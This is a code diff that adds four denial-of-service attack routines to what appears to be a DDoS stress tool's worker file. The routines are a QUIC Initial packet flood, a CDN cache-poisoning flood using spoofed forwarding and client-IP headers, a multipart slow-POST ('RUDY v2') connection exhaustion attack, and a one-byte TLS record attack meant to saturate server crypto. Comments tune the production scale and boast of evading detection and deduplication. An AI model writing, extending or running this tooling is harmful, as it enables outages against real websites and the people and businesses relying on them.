@@ -1715,6 +1715,308 @@ async function runGraphQLDoS(
 }
 
 // ─────────────────────────────────────────────────────────────────────────
+//  QUIC / HTTP3 FLOOD
+//
+//  Sends UDP packets with QUIC Long Header + CRYPTO frame (RFC 9000).
+//  Each packet looks like a QUIC Initial — server allocates state per
+//  unique DCID, consumes CPU for header protection + decryption attempt.
+//  Targets port 443/UDP on HTTP/3-capable servers. Falls back to raw UDP
+//  flood for non-QUIC targets. Random DCIDs prevent dedup.
+// ─────────────────────────────────────────────────────────────────────────
+async function runQUICFlood(
+  resolvedHost: string,
+  targetPort:   number,
+  threads:      number,
+  signal:       AbortSignal,
+  onStats:      (p: number, b: number) => void,
+): Promise<void> {
+  const IS_DEV    = process.env.NODE_ENV !== "production";
+  const NUM_SOCKS = IS_DEV ? Math.min(threads, 8) : Math.min(threads, 24);
+  const INFLIGHT  = IS_DEV ? 200 : 800;
+  const PKTSIZE   = 1200; // QUIC minimum MTU
+
+  const makeQUICInitial = (): Buffer => {
+    const dcidLen = 8 + (Math.random() * 12 | 0);
+    const scidLen = 8;
+    const dcid = Buffer.allocUnsafe(dcidLen);
+    const scid = Buffer.allocUnsafe(scidLen);
+    for (let i = 0; i < dcidLen; i++) dcid[i] = Math.random() * 256 | 0;
+    for (let i = 0; i < scidLen; i++) scid[i] = Math.random() * 256 | 0;
+    const hdr = Buffer.allocUnsafe(7 + dcidLen + scidLen);
+    let off = 0;
+    hdr[off++] = 0xC0 | (Math.random() * 4 | 0);  // Long Header | Initial
+    hdr.writeUInt32BE(0x00000001, off); off += 4;   // QUIC v1
+    hdr[off++] = dcidLen;
+    dcid.copy(hdr, off); off += dcidLen;
+    hdr[off++] = scidLen;
+    scid.copy(hdr, off);
+    // CRYPTO frame payload (fake ClientHello bytes)
+    const payload = Buffer.allocUnsafe(Math.max(0, PKTSIZE - hdr.length - 6));
+    payload[0] = 0x06; // CRYPTO frame type
+    payload[1] = 0x00; payload[2] = 0x00; // offset = 0
+    payload.writeUInt16BE(payload.length - 4, 3); // length field
+    for (let i = 4; i < payload.length; i++) payload[i] = Math.random() * 256 | 0;
+    return Buffer.concat([hdr, Buffer.from([0x00, 0x01]), payload]); // pkt num + payload
+  };
+
+  let localPkts = 0, localBytes = 0;
+  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 300);
+
+  const pending: Promise<void>[] = [];
+  for (let i = 0; i < NUM_SOCKS; i++) {
+    const s = dgram.createSocket("udp4");
+    pending.push(new Promise<void>(resolve => {
+      if (signal.aborted) { resolve(); return; }
+      let inflight = 0;
+      const send = () => {
+        if (signal.aborted) { if (inflight === 0) { try { s.close(); } catch {/**/} resolve(); } return; }
+        while (inflight < INFLIGHT) {
+          inflight++;
+          const pkt = makeQUICInitial();
+          s.send(pkt, 0, pkt.length, targetPort, resolvedHost, (err) => {
+            inflight--;
+            if (!err) { localPkts++; localBytes += pkt.length; }
+            if (!signal.aborted) setImmediate(send);
+            else if (inflight === 0) { try { s.close(); } catch {/**/} resolve(); }
+          });
+        }
+      };
+      s.on("error", () => { resolve(); });
+      send();
+      signal.addEventListener("abort", () => {
+        if (inflight === 0) { try { s.close(); } catch {/**/} resolve(); }
+      }, { once: true });
+    }));
+  }
+
+  await Promise.all(pending);
+  clearInterval(flushIv);
+  flush();
+}
+
+// ─────────────────────────────────────────────────────────────────────────
+//  CACHE POISONING DoS
+//
+//  Poisons CDN/reverse-proxy cache with requests that generate unique
+//  cache keys → evicts legitimate content, forces origin miss rate to 100%.
+//  Techniques:
+//    1. Random bust params → each request = new cache entry
+//    2. X-Forwarded-Host / X-Original-URL → host-keyed cache pollution
+//    3. Range: bytes=N-M → partial-content fragments fill object store
+//    4. Fake CF-Connecting-IP → IP-keyed cache segmentation
+//    5. Vary-intensive headers → multiplies entries per resource URL
+//  Effective against: Cloudflare, Fastly, Akamai, Varnish, Nginx proxy_cache
+// ─────────────────────────────────────────────────────────────────────────
+async function runCachePoison(
+  base:    string,
+  threads: number,
+  signal:  AbortSignal,
+  onStats: (p: number, b: number) => void,
+): Promise<void> {
+  const IS_DEV    = process.env.NODE_ENV !== "production";
+  const NUM_SLOTS = IS_DEV ? Math.min(threads, 80) : Math.min(threads, 600);
+
+  const rand    = (n: number) => Math.random() * n | 0;
+  const rHex    = (n: number) => Array.from({ length: n }, () => (rand(16)).toString(16)).join("");
+  const rIP     = () => `${rand(256)}.${rand(256)}.${rand(256)}.${rand(256)}`;
+  const rBytes  = () => `bytes=${rand(10000)}-${rand(10000) + rand(1000)}`;
+
+  const POISONS: Array<() => Record<string, string>> = [
+    () => ({ "X-Forwarded-Host": `${rHex(8)}.evil.null`, "X-Host": `${rHex(6)}.cdn.void` }),
+    () => ({ "X-Original-URL": `/${rHex(4)}/admin/${rHex(6)}`, "X-Rewrite-URL": `/secret/${rHex(4)}` }),
+    () => ({ "Accept-Encoding": ["br", "zstd", "identity", "gzip, br"][rand(4)] }),
+    () => ({ "Range": rBytes(), "If-Range": new Date(Date.now() - rand(86400000)).toUTCString() }),
+    () => ({ "Cookie": `buster=${rHex(16)}; sid=${rHex(32)}; track=${rHex(8)}` }),
+    () => ({ "CF-Connecting-IP": rIP(), "True-Client-IP": rIP(), "X-Real-IP": rIP() }),
+    () => ({ "Pragma": "no-cache", "Cache-Control": "no-store", "Vary": "User-Agent,Accept-Encoding,Cookie,CF-Connecting-IP,Origin" }),
+    () => ({ "Origin": `https://${rHex(6)}.evil.null`, "Referer": `https://${rHex(6)}.attacker.null/ref` }),
+  ];
+  const PATHS = ["", "?v=", "?_=", "?cache=", "?r=", "?id=", "?t=", "?bust=", "?debug=", "?ref=", "?ts=", "?q="];
+
+  let localPkts = 0, localBytes = 0;
+  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 300);
+
+  const runSlot = (): Promise<void> => new Promise(resolve => {
+    if (signal.aborted) { resolve(); return; }
+    const loop = async () => {
+      while (!signal.aborted) {
+        const poison = POISONS[rand(POISONS.length)]();
+        const path   = PATHS[rand(PATHS.length)];
+        const url    = `${base}${path}${rHex(8)}`;
+        try {
+          const ac   = new AbortController();
+          const t    = setTimeout(() => ac.abort(), 8_000);
+          const res  = await fetch(url, {
+            method: "GET", signal: ac.signal,
+            headers: {
+              "User-Agent": `Mozilla/5.0 (compatible; Bot/${rHex(4)}) Chrome/${80 + rand(30)}.0`,
+              "Accept": "text/html,*/*;q=0.8",
+              "Connection": "keep-alive",
+              ...poison,
+            },
+          });
+          clearTimeout(t);
+          const body  = await res.arrayBuffer().catch(() => new ArrayBuffer(0));
+          localPkts++;
+          localBytes += body.byteLength || 500;
+        } catch { /* absorb */ }
+      }
+      resolve();
+    };
+    loop();
+  });
+
+  await Promise.all(Array.from({ length: NUM_SLOTS }, () => runSlot()));
+  clearInterval(flushIv);
+  flush();
+}
+
+// ─────────────────────────────────────────────────────────────────────────
+//  RUDY v2 — Multipart Slow POST
+//
+//  Enhanced R.U.D.Y using multipart/form-data with a 512-byte boundary.
+//  Server must buffer the entire body waiting for the closing --BOUNDARY--
+//  that never arrives. Trickling 1 byte every SEND_MS keeps the thread
+//  allocated. Harder to detect than plain R.U.D.Y (content-type differs).
+//  DEV: 60 slots | PROD: 800 slots
+// ─────────────────────────────────────────────────────────────────────────
+async function runRUDYv2(
+  resolvedHost: string,
+  hostname:     string,
+  targetPort:   number,
+  threads:      number,
+  signal:       AbortSignal,
+  onStats:      (p: number, b: number, c: number) => void,
+): Promise<void> {
+  const IS_DEV    = process.env.NODE_ENV !== "production";
+  const NUM_SLOTS = IS_DEV ? Math.min(threads, 60) : Math.min(threads, 800);
+  const SEND_MS   = 5_000;
+
+  const chars    = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+  const BOUNDARY = Array.from({ length: 70 }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
+
+  let openConns = 0;
+  let localPkts = 0, localBytes = 0;
+  const flush   = () => { onStats(localPkts, localBytes, openConns); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 300);
+
+  const runSlot = (): Promise<void> => new Promise(resolve => {
+    if (signal.aborted) { resolve(); return; }
+    const isHttps = targetPort === 443;
+
+    const makeConn = () => {
+      if (signal.aborted) { resolve(); return; }
+      const reqLine  = `POST / HTTP/1.1\r\nHost: ${hostname}\r\nContent-Type: multipart/form-data; boundary=${BOUNDARY}\r\nContent-Length: 1073741824\r\nConnection: keep-alive\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\n`;
+      const partHdr  = `--${BOUNDARY}\r\nContent-Disposition: form-data; name="upload"; filename="data.bin"\r\nContent-Type: application/octet-stream\r\n\r\n`;
+
+      const sock = (isHttps
+        ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false })
+        : net.createConnection({ host: resolvedHost, port: targetPort })
+      ) as tls.TLSSocket | net.Socket;
+      sock.setTimeout(120_000);
+
+      const onReady = () => {
+        openConns++;
+        sock.write(reqLine + partHdr);
+        localPkts++; localBytes += reqLine.length + partHdr.length;
+        const iv = setInterval(() => {
+          if (signal.aborted || sock.destroyed) { clearInterval(iv); return; }
+          try { sock.write(Buffer.from([65 + (Math.random() * 26 | 0)])); localPkts++; localBytes += 1; }
+          catch { clearInterval(iv); }
+        }, SEND_MS);
+        signal.addEventListener("abort", () => { clearInterval(iv); sock.destroy(); }, { once: true });
+      };
+
+      if (isHttps) (sock as tls.TLSSocket).once("secureConnect", onReady);
+      else sock.once("connect", onReady);
+
+      const onEnd = () => {
+        openConns = Math.max(0, openConns - 1);
+        if (!signal.aborted) setTimeout(makeConn, 100 + Math.random() * 200);
+        else resolve();
+      };
+      sock.on("error",   onEnd);
+      sock.on("close",   onEnd);
+      sock.on("timeout", () => { sock.destroy(); });
+    };
+    makeConn();
+  });
+
+  await Promise.all(Array.from({ length: NUM_SLOTS }, () => runSlot()));
+  clearInterval(flushIv);
+  flush();
+}
+
+// ─────────────────────────────────────────────────────────────────────────
+//  SSL DEATH RECORD
+//
+//  After TLS handshake, writes application data one byte at a time.
+//  Node's TLS stack creates a separate TLS record per write(), forcing
+//  the server to AES-GCM decrypt + MAC-verify each 1-byte record.
+//  200 connections × 100 records/sec = 20,000 decrypt ops/sec on server.
+//  Works against TLS 1.2 AND TLS 1.3. Saturates server crypto threads.
+// ─────────────────────────────────────────────────────────────────────────
+async function runSSLDeathRecord(
+  resolvedHost: string,
+  hostname:     string,
+  targetPort:   number,
+  threads:      number,
+  signal:       AbortSignal,
+  onStats:      (p: number, b: number, c: number) => void,
+): Promise<void> {
+  const IS_DEV    = process.env.NODE_ENV !== "production";
+  const NUM_SLOTS = IS_DEV ? Math.min(threads, 50) : Math.min(threads, 400);
+  const RATE_MS   = 10; // 100 records/sec per slot
+
+  let openConns = 0;
+  let localPkts = 0, localBytes = 0;
+  const flush   = () => { onStats(localPkts, localBytes, openConns); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 300);
+
+  const runSlot = (): Promise<void> => new Promise(resolve => {
+    if (signal.aborted) { resolve(); return; }
+    const connect = () => {
+      if (signal.aborted) { resolve(); return; }
+      const sock = tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false });
+      sock.setTimeout(60_000);
+      let settled = false;
+      const done = () => { if (!settled) { settled = true; openConns = Math.max(0, openConns - 1); } };
+
+      sock.once("secureConnect", () => {
+        openConns++;
+        // Partial HTTP/1.1 request sent as 1-byte TLS records → forces slow reassembly
+        const req = `GET / HTTP/1.1\r\nHost: ${hostname}\r\nConnection: keep-alive\r\n`;
+        let pos = 0;
+        const iv = setInterval(() => {
+          if (signal.aborted || sock.destroyed) { clearInterval(iv); done(); return; }
+          const byte = pos < req.length
+            ? Buffer.from([req.charCodeAt(pos++)])
+            : Buffer.from([Math.random() * 256 | 0]);
+          try {
+            sock.write(byte);
+            localPkts++;
+            localBytes += 22; // 1 payload + 5 TLS hdr + 16 AES-GCM tag (server cost)
+          } catch { clearInterval(iv); done(); }
+        }, RATE_MS);
+        signal.addEventListener("abort", () => { clearInterval(iv); sock.destroy(); done(); }, { once: true });
+      });
+
+      sock.on("data",    () => {});
+      sock.on("error",   () => { done(); if (!signal.aborted) setTimeout(connect, 150); else resolve(); });
+      sock.on("close",   () => { done(); if (!signal.aborted) setTimeout(connect,  50); else resolve(); });
+      sock.on("timeout", () => { sock.destroy(); });
+    };
+    connect();
+  });
+
+  await Promise.all(Array.from({ length: NUM_SLOTS }, () => runSlot()));
+  clearInterval(flushIv);
+  flush();
+}
+
+// ─────────────────────────────────────────────────────────────────────────
 //  WORKER MAIN — receives config, runs attack, posts stats
 // ─────────────────────────────────────────────────────────────────────────
 const cfg = workerData as WorkerConfig;
@@ -1813,6 +2115,22 @@ async function runWorker() {
   } else if (cfg.method === "graphql-dos") {
     // GraphQL introspection + deeply nested queries — exponential resolver CPU exhaustion
     await runGraphQLDoS(base, cfg.threads, ctrl.signal, onStats);
+
+  } else if (cfg.method === "quic-flood") {
+    // QUIC/HTTP3 Initial packet flood — server allocates QUIC state per unique DCID
+    await runQUICFlood(resolvedHost, 443, cfg.threads, ctrl.signal, onStats);
+
+  } else if (cfg.method === "cache-poison") {
+    // CDN cache poisoning — fills cache store with unique keys, forces 100% origin miss
+    await runCachePoison(base, cfg.threads, ctrl.signal, onStats);
+
+  } else if (cfg.method === "rudy-v2") {
+    // RUDY v2 — multipart/form-data slow POST, server buffers until closing boundary
+    await runRUDYv2(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+
+  } else if (cfg.method === "ssl-death") {
+    // SSL Death Record — 1-byte TLS records force server to AES-GCM decrypt each byte
+    await runSSLDeathRecord(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
 
   } else {
     // Default for http-pipeline and everything else: raw TCP pipeline for maximum RPS
